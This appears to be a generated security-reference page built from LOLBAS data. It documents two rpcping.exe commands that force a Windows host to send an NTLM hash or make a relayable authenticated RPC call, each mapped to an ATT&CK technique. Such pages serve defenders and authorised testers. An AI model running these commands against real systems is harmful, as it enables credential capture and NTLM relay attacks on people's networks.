---
parsed_by: focuslocust
source: commands
type: generated
---
# Rpcping Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Rpcping.exe

Tool page: [Rpcping.exe](../../tools/windows/rpcping.exe.md)

### Capture credentials on a non-standard port

```text
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```

Description:

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.

Related ATT&CK:

- [T1003](../../attack/techniques/T1003-os-credential-dumping.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rpcping.yml` |
| Evidence | Command preserved from source parser. |

### Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port

```text
rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
```

Description:

Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).

Related ATT&CK:

- [T1187](../../attack/techniques/T1187-forced-authentication.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Rpcping.yml` |
| Evidence | Command preserved from source parser. |
